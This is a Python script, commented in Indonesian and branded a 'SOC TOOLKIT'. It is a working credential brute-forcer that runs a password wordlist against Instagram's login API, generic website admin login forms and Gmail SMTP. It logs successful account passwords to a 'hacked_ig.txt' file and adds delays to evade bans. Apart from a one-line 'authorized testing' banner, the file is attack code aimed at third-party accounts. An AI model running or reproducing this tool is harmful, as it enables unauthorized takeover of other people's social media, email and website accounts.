import sys
import os
import time
import asyncio
import requests
import smtplib
import re
import urllib3
from aiohttp import ClientSession, ClientTimeout
from aiohttp_socks import ProxyConnector
from termcolor import colored, cprint
import pyfiglet

# Disable SSL warnings agar terminal bersih
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- KONFIGURASI GLOBAL ---
# Kosongkan jika tidak pakai proxy. Format: "user:pass@host:port"
# Biarkan kosong untuk keamanan (menggunakan IP sendiri/VPN/Anonsurf)
PROXY_CONFIG = "" 
CA_CERT_PATH = "SSL.crt" # Opsional

# ==========================================
# BAGIAN 1: TAMPILAN (BANNER) & UTILITIES
# ==========================================

def print_banner():
    # Membersihkan layar terminal (Windows/Linux support)
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Membuat Banner Besar dengan Font 'Slant'
    banner_font = pyfiglet.figlet_format("SOC  TOOLKIT", font="slant")
    cprint(banner_font, 'cyan', attrs=['bold'])
    
    # Kotak Informasi Personal (Customized for INDRAYAZA Z)
    print(colored("+" + "-" * 58 + "+", 'white'))
    print(colored("|", 'white') + colored("  AUTHOR    : INDRAYAZA Z", 'yellow', attrs=['bold']) + " " * 27 + colored("|", 'white'))
    print(colored("|", 'white') + colored("  CERTIFIED : Legal Siber Operation Center Analyst", 'cyan') + " " * 3 + colored("|", 'white'))
    print(colored("|", 'white') + colored("  STATUS    : PRIVATE RELEASE v1.0", 'red') + " " * 22 + colored("|", 'white'))
    print(colored("+" + "-" * 58 + "+", 'white'))
    print(colored("\n[!] WARNING: Use only for authorized penetration testing.", 'red'))
    print(colored("-" * 60, 'white'))

def get_password_list():
    # Logika Cerdas: Cek apakah ada file default 'pass.txt'
    if os.path.exists("pass.txt"):
        print(colored(f"[?] File 'pass.txt' ditemukan di folder ini.", 'cyan'))
        pilih = input(colored("    Gunakan file ini? (y/n): ", 'yellow')).lower()
        if pilih == 'y':
            filename = "pass.txt"
        else:
            filename = input(colored(">> Masukkan nama file password lain: ", 'cyan')).strip()
    else:
        # Jika tidak ada pass.txt, tanya manual
        print(colored("\n[?] Masukkan nama file password (wordlist):", 'cyan'))
        filename = input(">> ").strip()

    # Proses Membaca File
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()
        print(colored(f"[+] LOADED: Berhasil memuat {len(passwords)} password.", 'green', attrs=['bold']))
        print(colored("-" * 60, 'white'))
        return passwords
    except FileNotFoundError:
        print(colored(f"[!] ERROR: File '{filename}' tidak ditemukan!", 'red', attrs=['bold']))
        return []

# ==========================================
# BAGIAN 2: INSTAGRAM MODULE (ASYNC ENGINE)
# ==========================================

def GetCSRF_Token(use_proxy=False):
    headers = {'Host': 'www.instagram.com', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    proxies = {'http': PROXY_CONFIG, 'https': PROXY_CONFIG} if use_proxy and PROXY_CONFIG else None
    try:
        r = requests.get('https://www.instagram.com/', headers=headers, proxies=proxies, verify=False)
        csrf = re.search(r'csrftoken=([a-zA-Z0-9\-_]+)', r.headers.get('Set-Cookie', ''))
        return (csrf.group(1), r.text) if csrf else (None, None)
    except: return None, None

def Get_MID(csrf, use_proxy=False):
    cookies = {'csrftoken': csrf}
    headers = {'X-CSRFToken': csrf, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
    proxies = {'http': PROXY_CONFIG, 'https': PROXY_CONFIG} if use_proxy and PROXY_CONFIG else None
    try:
        r = requests.get('https://www.instagram.com/api/v1/web/data/shared_data/', cookies=cookies, headers=headers, proxies=proxies, verify=False)
        mid = re.search(r'mid=([^;]+)', r.headers.get('Set-Cookie', ''))
        return mid.group(1) if mid else None
    except: return None

async def ig_attempt(session, user, pwd, csrf, mid):
    timestamp = int(time.time())
    enc_pass = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{pwd}"
    data = {
        'enc_password': enc_pass, 'username': user, 
        'queryParams': '{}', 'optIntoOneTap': 'false'
    }
    headers = {
        'X-CSRFToken': csrf, 'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    cookies = {'csrftoken': csrf, 'mid': mid}
    
    try:
        async with session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                                cookies=cookies, headers=headers, data=data) as resp:
            return await resp.json()
    except: return {}

async def run_instagram_module(passwords):
    target = input(colored(">> Target Username: ", 'cyan'))
    print(colored("[*] Inisialisasi Session Instagram...", "yellow"))
    
    csrf, html = GetCSRF_Token()
    if not csrf: 
        print(colored("[!] Gagal mengambil Token CSRF. Cek koneksi internet.", "red"))
        return
    
    mid = Get_MID(csrf)
    timeout = ClientTimeout(total=60)
    
    print(colored(f"[*] Target locked: {target}", "green"))
    
    async with ClientSession(timeout=timeout) as session:
        for pwd in passwords:
            res = await ig_attempt(session, target, pwd, csrf, mid)
            if 'userId' in res:
                print(colored(f"[SUCCESS] {target}:{pwd}", 'green', attrs=['bold']))
                with open('hacked_ig.txt', 'a') as f: f.write(f"{target}:{pwd}\n")
                return
            elif 'checkpoint_url' in res:
                print(colored(f"[CHECKPOINT] {target}:{pwd}", 'yellow'))
                with open('hacked_ig.txt', 'a') as f: f.write(f"{target}:{pwd} (Checkpoint)\n")
                return
            else:
                print(f"[FAIL] {pwd}")
            await asyncio.sleep(1) # Delay anti-ban

# ==========================================
# BAGIAN 3: WEBSITE & GMAIL MODULES
# ==========================================

def run_website_module(passwords):
    url = input(colored(">> URL Login (cth: http://site.com/admin): ", 'cyan'))
    u_field = input(">> Name form username (inspect element, cth: user): ")
    p_field = input(">> Name form password (inspect element, cth: pass): ")
    target_u = input(">> Target Username: ")
    
    print(colored(f"[*] Memulai serangan ke {url}", "cyan"))
    
    for pwd in passwords:
        payload = {u_field: target_u, p_field: pwd, "submit": "Login"}
        try:
            r = requests.post(url, data=payload, timeout=5)
            # Logika deteksi sederhana (Response 200 OK biasanya sukses jika sebelumnya redirect/403)
            # Anda bisa menyesuaikan logika ini tergantung target spesifik
            if r.status_code == 200 and ("error" not in r.text.lower() and "failed" not in r.text.lower()):
                print(colored(f"[POTENTIAL] {pwd} (Cek manual, response code 200)", 'yellow'))
            else:
                print(f"[FAIL] {pwd}")
        except KeyboardInterrupt: break
        except: pass

def run_gmail_module(passwords):
    target = input(colored(">> Target Email: ", 'cyan'))
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    
    print(colored("[*] Memulai serangan SMTP...", "cyan"))
    for pwd in passwords:
        try:
            server.login(target, pwd)
            print(colored(f"[SUCCESS] {pwd}", 'green', attrs=['bold']))
            break
        except smtplib.SMTPAuthenticationError:
            print(f"[FAIL] {pwd}")
        except Exception as e:
            print(colored(f"[ERROR] Rate Limit/Blocked by Google: {e}", 'red'))
            break

# ==========================================
# BAGIAN 4: MAIN MENU CONTROLLER
# ==========================================

def main():
    print_banner()
    print(colored("Pilih Target Operasi:", 'white', attrs=['bold']))
    print("1. Instagram (Async Optimized)")
    print("2. Website Admin Panel (Generic HTTP)")
    print("3. Gmail (SMTP Protocol)")
    print("4. Exit")
    
    choice = input(colored("\n[?] Pilihan (1-4): ", 'yellow'))
    
    if choice == '4': 
        print(colored("Exiting Tool... Stay Safe.", 'red'))
        sys.exit()
    
    # Load password sekali untuk semua modul
    passwords = get_password_list()
    if not passwords: return

    if choice == '1':
        try:
            asyncio.run(run_instagram_module(passwords))
        except KeyboardInterrupt:
            print("\n[!] Stopped.")
    elif choice == '2':
        run_website_module(passwords)
    elif choice == '3':
        run_gmail_module(passwords)
    else:
        print("Pilihan tidak valid.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] Program dihentikan pengguna.", 'red'))
```
